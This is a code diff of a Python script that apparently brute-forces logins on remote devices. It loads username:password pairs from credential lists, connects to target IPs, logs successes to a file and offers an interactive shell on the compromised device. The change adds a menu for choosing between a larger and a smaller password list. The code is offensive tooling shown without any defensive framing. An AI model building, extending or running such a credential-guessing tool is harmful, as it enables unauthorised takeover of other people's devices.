@@ -17,16 +17,24 @@ USER=[]
 PASS=[]
 total_list=0
 
-def load():
+def load(option):
 
-    with open("passwords.txt","r") as f:
-        for line in f:
-            USER.append(line.split(":")[0])
-            PASS.append(line.strip("\n").split(":")[1])
-            global total_list
-            total_list+=1
+    global total_list
 
-def conexion(ip):
+    if option==1:
+        with open("passwords.txt","r") as f:
+            for line in f:
+                USER.append(line.split(":")[0])
+                PASS.append(line.strip("\n").split(":")[1])
+                total_list+=1
+    if option==2:
+        with open("passwords_small.txt","r") as f:
+            for line in f:
+                USER.append(line.split(":")[0])
+                PASS.append(line.strip("\n").split(":")[1])
+                total_list+=1
+
+def conexion(ip, option):
 
     equipos=open("equipos.txt","a")
 
@@ -255,7 +263,13 @@ REMEMBER! Press exit to leave the device | To concatenate commands just add ; ex
 
         if option==8:
 
-            load()
+            option=int(input('''
+1) passwords.txt ( 135 combinations, this file goes slower but it has more combos )
+2) passwords_small.txt ( 4 combinations, this file goes faster but it has less combos )
+
+Select the option: '''))
+
+            load(option)
 
             while 1:
 
@@ -269,7 +283,7 @@ REMEMBER! Press exit to leave the device | To concatenate commands just add ; ex
 
                         try:
 
-                            conexion(a)
+                            conexion(a,option)
 
                         except:
 
